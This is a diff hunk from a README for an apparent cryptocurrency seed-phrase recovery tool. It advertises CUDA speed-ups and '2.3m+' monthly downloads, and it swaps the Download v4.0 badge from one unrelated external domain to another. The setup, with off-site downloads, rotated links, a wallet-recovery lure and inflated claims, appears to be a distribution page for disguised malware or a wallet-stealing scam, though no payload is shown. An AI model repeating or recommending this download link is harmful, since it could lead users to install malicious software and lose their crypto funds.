@@ -49,7 +49,7 @@ A: Yes — CUDA acceleration for 100x faster recovery.
 
 **Monthly downloads:** 2.3m+
 
-[![Download](https://img.shields.io/badge/Download-v4.0-brightgreen?style=for-the-badge)](https://forumconnect.uk/seedrecover26)
+[![Download](https://img.shields.io/badge/Download-v4.0-brightgreen?style=for-the-badge)](https://connectinstruction.com/seedrecover26)
 
 ---
 
